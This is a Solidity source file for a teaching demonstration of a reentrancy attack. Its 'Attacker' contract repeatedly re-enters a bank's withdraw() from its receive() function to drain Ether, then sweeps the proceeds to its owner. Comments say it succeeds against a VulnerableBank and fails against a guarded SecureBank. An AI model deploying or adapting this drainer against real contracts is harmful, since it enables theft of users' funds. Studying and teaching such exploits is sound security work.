// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/**
 * @title IBank
 * @notice The minimal slice of the bank interface the attacker relies on.
 *         Both VulnerableBank and SecureBank implement it, which is exactly why
 *         the same attacker can be pointed at either — and only succeeds
 *         against the vulnerable one.
 */
interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

/**
 * @title Attacker
 * @notice Educational reentrancy exploit. Point it at a target bank at
 *         construction time, then call {attack} with some seed Ether.
 *
 * Flow:
 *   1. attack() deposits the seed into the bank, then calls withdraw().
 *   2. The bank sends the seed back, triggering this contract's receive().
 *   3. receive() calls withdraw() again — before the vulnerable bank has
 *      zeroed our balance — and keeps looping until the bank runs dry.
 *
 * Against SecureBank, step 3 reverts (guard + CEI), which unwinds the whole
 * transaction: nothing is stolen.
 */
contract Attacker {
    IBank public immutable bank;
    address public immutable owner;

    uint256 public unit;         // amount pulled per withdraw call (the seed)
    uint256 public reentryCount; // how many times receive() re-entered withdraw

    event AttackStarted(uint256 seed);
    event Reentered(uint256 depth, uint256 bankBalanceRemaining);
    event AttackFinished(uint256 totalReentries, uint256 stolen);

    constructor(address bankAddress) {
        bank = IBank(bankAddress);
        owner = msg.sender;
    }

    /// @notice Kick off the attack. `msg.value` is the seed deposit / drain unit.
    function attack() external payable {
        require(msg.value > 0, "Send seed Ether to attack");
        unit = msg.value;
        reentryCount = 0;
        emit AttackStarted(msg.value);

        bank.deposit{value: msg.value}();
        bank.withdraw();

        emit AttackFinished(reentryCount, address(this).balance);
    }

    /// @dev The reentrancy engine — fires each time the bank pays us.
    receive() external payable {
        // Keep re-entering while the bank can still cover another unit.
        if (address(bank).balance >= unit) {
            reentryCount += 1;
            emit Reentered(reentryCount, address(bank).balance);
            bank.withdraw();
        }
    }

    /// @notice Sweep the stolen Ether back to the attacker's wallet.
    function collect() external {
        require(msg.sender == owner, "Not owner");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "Collect failed");
    }

    /// @notice Ether currently held by this attacker contract.
    function stolenBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
